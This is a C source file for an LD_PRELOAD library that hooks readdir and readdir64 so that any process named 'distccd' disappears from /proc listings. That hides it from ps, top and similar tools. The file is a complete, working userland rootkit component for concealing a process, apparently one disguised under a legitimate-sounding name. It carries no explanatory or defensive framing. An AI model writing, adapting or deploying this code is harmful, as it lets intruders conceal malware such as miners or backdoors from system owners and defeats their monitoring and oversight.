#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static const char * proc = "distccd";

static int get_dir_name(DIR* dirp, char* buf)
{
	const int fd = dirfd(dirp);
	if (fd == -1) return 0;
	char path[32] = "/proc/self/fd/";
	snprintf(path + 14, 8, "%d", fd);
	const ssize_t ret = readlink(path, buf, 256);
	if (ret) buf[ret] = 0;
	return ret;
}

static char * get_process_name(char* pid, char* buf)
{
	snprintf(buf + 5, 256, "/%s/comm", pid);
	FILE * f = fopen(buf, "r");
	if (!f) return 0;
	char * const ret = fgets(buf, 256, f);
	buf[strlen(buf) - 1] = 0;
	fclose(f);
	return ret;
}

#define DECLARE_READDIR(dirent, readdir)                               \
static struct dirent* (*original_##readdir)(DIR*) = NULL;              \
struct dirent* readdir(DIR * const dirp)                               \
{                                                                      \
	if (!original_##readdir)                                           \
		original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
	                                                                   \
	while (1) {                                                        \
		struct dirent * const dir = original_##readdir(dirp);          \
		char buffer[256];                                              \
		if (!dir                                  ||                   \
		    !get_dir_name(dirp, buffer)           ||                   \
		    strcmp(buffer, "/proc")               ||                   \
		    !get_process_name(dir->d_name, buffer)||                   \
		    strcmp(buffer, proc))                                      \
			return dir;                                                \
	}                                                                  \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
